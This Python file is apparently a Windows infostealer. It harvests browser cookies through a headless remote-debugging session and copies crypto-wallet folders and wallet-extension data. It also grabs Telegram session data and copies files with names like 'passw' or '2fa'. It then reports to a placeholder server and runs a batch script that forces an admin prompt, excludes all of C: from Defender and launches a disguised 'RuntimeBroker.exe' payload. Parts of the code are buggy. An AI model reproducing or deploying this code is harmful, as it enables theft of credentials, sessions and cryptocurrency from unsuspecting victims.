import sys
import os
import base64
import json
import re
import sqlite3
import shutil
import subprocess
import zipfile
from zipfile import ZipFile
from urllib.request import Request, urlopen
import time
desktop_logs_path = os.path.join(os.path.expanduser("~"), "Desktop", "Logs")
if not os.path.exists(desktop_logs_path):
    os.makedirs(desktop_logs_path)


userid = "3"

CURRENT_INTERPRETER = sys.executable
proc = subprocess.Popen([CURRENT_INTERPRETER, "-m", "pip", "install", "pycryptodome", "pypiwin32", "pywin32","requests", "websocket-client"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,creationflags=subprocess.CREATE_NO_WINDOW)
proc.wait()

try:
    import win32crypt
    from Crypto.Cipher import AES
    import requests
    import websocket

except:
    current_file = os.path.abspath(__file__)
    subprocess.Popen([CURRENT_INTERPRETER, current_file], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,creationflags=subprocess.CREATE_NO_WINDOW)
    exit()

USER_PROFILE = os.getenv('USERPROFILE')
APPDATA = os.getenv('APPDATA')
LOCALAPPDATA = os.getenv('LOCALAPPDATA')
STORAGE_PATH = os.path.join(APPDATA, "Microsoft Store")
PROGRAMFILESX86 = os.getenv("ProgramFiles(x86)")

COOKIECOUNT = 0
FILES = []

if os.path.exists(os.path.join(LOCALAPPDATA, "HD Realtek Audio Player")):
    sys.exit(0)
else:
    os.makedirs(os.path.join(LOCALAPPDATA, "HD Realtek Audio Player"))

if not os.path.exists(STORAGE_PATH):
    os.makedirs(STORAGE_PATH)

CHROME_PATHS = [
    {"name": "Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"), "taskname": "chrome.exe", "exepath": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"},
	{"name": "Chrome (x86)", "path": os.path.join(LOCALAPPDATA, "Google(x86)", "Chrome", "User Data"), "taskname": "chrome.exe", "exepath": PROGRAMFILESX86 + "\\Google\\Chrome\\Application\\chrome.exe"},
	{"name": "Chrome SxS", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome SxS", "User Data"), "taskname": "chrome.exe", "exepath": LOCALAPPDATA + "\\Google\\Chrome SxS\\Application\\chrome.exe"},
	{"name": "Edge", "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"), "taskname": "msedge.exe", "exepath": PROGRAMFILESX86 + "\\Microsoft\\Edge\\Application\\msedge.exe"},
	{"name": "Brave", "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"), "taskname": "brave.exe", "exepath": "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"},
]

CHROMIUM_BROWSERS = [
    {"name": "Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"), "taskname": "chrome.exe", "exepath": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"},
	{"name": "Chrome (x86)", "path": os.path.join(LOCALAPPDATA, "Google(x86)", "Chrome", "User Data"), "taskname": "chrome.exe", "exepath": PROGRAMFILESX86 + "\\Google\\Chrome\\Application\\chrome.exe"},
	{"name": "Chrome SxS", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome SxS", "User Data"), "taskname": "chrome.exe", "exepath": LOCALAPPDATA + "\\Google\\Chrome SxS\\Application\\chrome.exe"},
	{"name": "Edge", "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"), "taskname": "msedge.exe", "exepath": PROGRAMFILESX86 + "\\Microsoft\\Edge\\Application\\msedge.exe"},
	{"name": "Brave", "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"), "taskname": "brave.exe", "exepath": "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"},
    {"name": "Chromium", "path": os.path.join(LOCALAPPDATA, "Chromium", "User Data"), "taskname": "chromium.exe", "exepath": "C:\\Program Files\\Chromium\\Application\\chrome.exe"},
]

CHROMIUM_SUBPATHS = [
    {"path": ""},
    {"path": "Default"},
    {"path": "Profile 1"},
    {"path": "Profile 2"},
    {"path": "Profile 3"},
    {"path": "Profile 4"},
    {"path": "Profile 5"},
]

BROWSER_EXTENSIONS = [
    {"name": "Authenticator", "path": "\\Local Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai"},
    {"name": "Binance", "path": "\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp"},
    {"name": "Bitapp", "path": "\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi"},
    {"name": "BoltX", "path": "\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca"},
    {"name": "Coin98", "path": "\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg"},
    {"name": "Coinbase", "path": "\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad"},
    {"name": "Core", "path": "\\Local Extension Settings\\agoakfejjabomempkjlepdflaleeobhb"},
    {"name": "Crocobit", "path": "\\Local Extension Settings\\pnlfjmlcjdjgkddecgincndfgegkecke"},
    {"name": "Equal", "path": "\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac"},
    {"name": "Ever", "path": "\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk"},
    {"name": "ExodusWeb3", "path": "\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno"},
    {"name": "Fewcha", "path": "\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj"},
    {"name": "Finnie", "path": "\\Local Extension Settings\\cjmkndjhnagcfbpiemnkdpomccnjblmj"},
    {"name": "Guarda", "path": "\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln"},
    {"name": "Guild", "path": "\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj"},
    {"name": "HarmonyOutdated", "path": "\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib"},
    {"name": "Iconex", "path": "\\Local Extension Settings\\flpiciilemghbmfalicajoolhkkenfel"},
    {"name": "Jaxx Liberty", "path": "\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne"},
    {"name": "Kaikas", "path": "\\Local Extension Settings\\jblndlipeogpafnldhgmapagcccfchpi"},
    {"name": "KardiaChain", "path": "\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk"},
    {"name": "Keplr", "path": "\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap"},
    {"name": "Liquality", "path": "\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn"},
    {"name": "MEWCX", "path": "\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm"},
    {"name": "MaiarDEFI", "path": "\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm"},
    {"name": "Martian", "path": "\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk"},
    {"name": "Math", "path": "\\Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc"},
    {"name": "Metamask", "path": "\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"},
    {"name": "Metamask2", "path": "\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm"},
    {"name": "Mobox", "path": "\\Local Extension Settings\\fcckkdbjnoikooededlapcalpionmalo"},
    {"name": "Nami", "path": "\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo"},
    {"name": "Nifty", "path": "\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid"},
    {"name": "Oxygen", "path": "\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh"},
    {"name": "PaliWallet", "path": "\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn"},
    {"name": "Petra", "path": "\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci"},
    {"name": "Phantom", "path": "\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa"},
    {"name": "Pontem", "path": "\\Local Extension Settings\\phkbamefinggmakgklpkljjmgibohnba"},
    {"name": "Ronin", "path": "\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec"},
    {"name": "Safepal", "path": "\\Local Extension Settings\\lgmpcpglpngdoalbgeoldeajfclnhafa"},
    {"name": "Saturn", "path": "\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig"},
    {"name": "Slope", "path": "\\Local Extension Settings\\pocmplpaccanhmnllbbkpgfliimjljgo"},
    {"name": "Solfare", "path": "\\Local Extension Settings\\bhhhlbepdkbapadjdnnojkbgioiodbic"},
    {"name": "Sollet", "path": "\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno"},
    {"name": "Starcoin", "path": "\\Local Extension Settings\\mfhbebgoclkghebffdldpobeajmbecfk"},
    {"name": "Swash", "path": "\\Local Extension Settings\\cmndjbecilbocjfkibfbifhngkdmjgog"},
    {"name": "TempleTezos", "path": "\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc"},
    {"name": "TerraStation", "path": "\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp"},
    {"name": "Tokenpocket", "path": "\\Local Extension Settings\\mfgccjchihfkkindfppnaooecgfneiii"},
    {"name": "Ton", "path": "\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd"},
    {"name": "Tron", "path": "\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec"},
    {"name": "Trust Wallet", "path": "\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph"},
    {"name": "Wombat", "path": "\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih"},
    {"name": "XDEFI", "path": "\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf"},
    {"name": "XMR.PT", "path": "\\Local Extension Settings\\eigblbgjknlfbajkfhopmcojidlgcehm"},
    {"name": "XinPay", "path": "\\Local Extension Settings\\bocpokimicclpaiekenaeelehdjllofo"},
    {"name": "Yoroi", "path": "\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb"},
    {"name": "iWallet", "path": "\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj"}
]

WALLET_PATHS = [
    {"name": "Atomic", "path": os.path.join(APPDATA, "atomic", "Local Storage", "leveldb")},
    {"name": "Exodus", "path": os.path.join(APPDATA, "Exodus", "exodus.wallet")},
    {"name": "Electrum", "path": os.path.join(APPDATA, "Electrum", "wallets")},
    {"name": "Electrum-LTC", "path": os.path.join(APPDATA, "Electrum-LTC", "wallets")},
    {"name": "Zcash", "path": os.path.join(APPDATA, "Zcash")},
    {"name": "Armory", "path": os.path.join(APPDATA, "Armory")},
    {"name": "Bytecoin", "path": os.path.join(APPDATA, "bytecoin")},
    {"name": "Jaxx", "path": os.path.join(APPDATA, "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb")},
    {"name": "Etherium", "path": os.path.join(APPDATA, "Ethereum", "keystore")},
    {"name": "Guarda", "path": os.path.join(APPDATA, "Guarda", "Local Storage", "leveldb")},
    {"name": "Coinomi", "path": os.path.join(APPDATA, "Coinomi", "Coinomi", "wallets")},
]

PATHS_TO_SEARCH = [
    USER_PROFILE + "\\Desktop",
    USER_PROFILE + "\\Documents",
    USER_PROFILE + "\\Downloads",
    USER_PROFILE + "\\OneDrive\\Documents",
    USER_PROFILE + "\\OneDrive\\Desktop",
]

FILE_KEYWORDS = [
        "passw",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "2fa",
        "code",
        "memo",
        "token",
        "backup",
        "passphrase",
]

ALLOWED_EXTENSIONS = [
    ".txt",
    ".log",
    ".doc",
    ".docx",
    ".xls",
    ".xlsx",
    ".ppt",
    ".pptx",
    ".odt",
    ".pdf",
    ".rtf",
    ".json",
    ".csv",
    ".db",
    ".jpg",
    ".jpeg",
    ".png",
    ".gif",
    ".webp",
    ".mp4"
]



PASSWORDS = []
COOKIES = []
WEB_DATA = []

def kill_process(process_name):
    result = subprocess.Popen(f"taskkill /im {process_name} /t /f >nul 2>&1", shell=True)

def decrypt_data(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])


def zip_to_storage(name, source, destination):
    if os.path.isfile(source):
        with zipfile.ZipFile(destination + f"\\{name}.zip", "w") as z:
            z.write(source, os.path.basename(source))
    else:
        with zipfile.ZipFile(destination + f"\\{name}.zip", "w") as z:
            for root, dirs, files in os.walk(source):
                for file in files:
                    z.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), os.path.join(source, '..')))


def taskkill(taskname):
    try:
        if not taskname.endswith(".exe"):
            taskname += ".exe"
        subprocess.run(["taskkill", "/F", "/IM", taskname], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
    except:
        pass



def chromiumcookies(profilepath, browser, subpath, decryption_key):
    try:
        cookies_file = os.path.join(profilepath, "Network", "Cookies")
        temp_db = os.path.join(profilepath, f"{browser['name']}-ck.db")
        
        if os.path.exists(cookies_file):  
            shutil.copy(cookies_file, temp_db)  
        else:  
            return  # Skips execution if the file doesn't exist
        connection = sqlite3.connect(temp_db)
        cursor = connection.cursor()

        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")

        cookie_str = ""

        for row in cursor.fetchall():
            host = row[0]
            name = row[1]
            try:
                value = decrypt_data(row[2], decryption_key)
            except:
                value = "Decryption Failed"
            cookie_str += f"{host}\tTRUE\t/\tFALSE\t13355861278849698\t{name}\t{value}\n"
            COOKIECOUNT += 1
        COOKIES.append({"browser": browser["name"], "profile": subpath, "cookies": base64.b64encode(cookie_str.encode()).decode()})
        cursor.close()
        connection.close()
        os.remove(temp_db)
    except:
        pass


for wallet_file in WALLET_PATHS:
    if os.path.exists(wallet_file["path"]):
        try:
            zip_to_storage(wallet_file["name"], wallet_file["path"], STORAGE_PATH)
        except:
            pass

for browser in CHROME_PATHS:
    if os.path.exists(browser["path"]):
        try:
            taskkill(browser["taskname"])
            strtcmd = f'"{browser["exepath"]}" --headless --remote-debugging-port=9222 --remote-allow-origins=* --user-data-dir="{browser["path"]}"'
            subprocess.Popen(strtcmd, creationflags=subprocess.CREATE_NEW_CONSOLE, close_fds=True)
            targets = requests.get("http://localhost:9222/json").json()
            ws_url = targets[0]["webSocketDebuggerUrl"]
            ws = websocket.create_connection(ws_url)
            payload = {
                "id": 1,
                "method": "Network.getAllCookies"
            }
            ws.send(json.dumps(payload))
            cookie_str = ""
            for cookie in json.loads(ws.recv())["result"]["cookies"]:
                cookie_str += f"{cookie['domain']}\tTRUE\t/\tFALSE\t13355861278849698\t{cookie['name']}\t{cookie['value']}\n"
                COOKIECOUNT = COOKIECOUNT + 1
            COOKIES.append({"browser": browser["name"], "profile": "Default", "cookies": base64.b64encode(cookie_str.encode()).decode()})
            ws.close()
            taskkill(browser["taskname"])
        except: pass

for path in PATHS_TO_SEARCH:
    for root, _, files in os.walk(path):
        for file_name in files:
            for keyword in FILE_KEYWORDS:
                if keyword in file_name.lower():
                    for extension in ALLOWED_EXTENSIONS:
                        if file_name.endswith(extension):
                            try:
                                realpath = os.path.join(root, file_name)
                                if os.path.isfile(realpath):
                                    shutil.copy(realpath, STORAGE_PATH)
                                else:
                                    zip_to_storage(realpath, STORAGE_PATH)
                            except:
                                pass

def telegram():
    try:
        kill_process("Telegram.exe")
    except:
        pass
    source_path = os.path.join(APPDATA, "Telegram Desktop", "tdata")
    
    if os.path.exists(source_path):
        zip_to_storage("tdata_session", source_path, STORAGE_PATH)

try:
    telegram()
except:
    pass

def create_log():
    for i in range(10):
        payload = {
            "passwordcount": len(PASSWORDS),
            "cookiecount": COOKIECOUNT,
            "filenames": FILES,
        }
        headers = {"X-User-Identifier": userid, "Content-Type": "application/json"}

        try:
            # Save log to Desktop before uploading
            log_filename = os.path.join(desktop_logs_path, "log.json")
            with open(log_filename, 'w') as log_file:
                json.dump(payload, log_file, indent=4)

            # Upload log to the website
            r = requests.post("https://example.com/create_log", json=payload, headers=headers)  # Placeholder URL
            if r.status_code == 200:
                try:
                    return r.json().get("log_uuid", "")
                except:
                    return ""
        except:
            return ""


try:
    shutil.rmtree(STORAGE_PATH)
except: pass


def create_and_run_bat_script():
    bat_script_content = '''
@echo off
set "filePath=%appdata%\\Microsoft\\emptyfile20947.txt"
:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------

mkdir "C:\Windows\WinEmptyfold"
powershell.exe -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:'"

set "temp_file=%appdata%\RuntimeBroker.exe"

# Insert payload

start "" "%temp_file%"

'''

    temp_folder = os.environ.get('TEMP', '')
    if temp_folder:
        bat_script_path = os.path.join(temp_folder, 'temp_script.bat')
        with open(bat_script_path, 'w') as bat_file:
            bat_file.write(bat_script_content)
        os.system(bat_script_path)
    else:
        print("Failed to get the TEMP folder path.")

if os.name == 'nt':
    folder_path = r"C:\Windows\WinEmptyfold"
    if os.path.exists(folder_path):
        exit()
    else:
        os.system('taskkill /f /im explorer.exe')
        create_and_run_bat_script()
        while True:
            os.system('timeout 5')
            if os.path.exists(folder_path):
                os.system('start explorer.exe')
                break
            else:
                create_and_run_bat_script()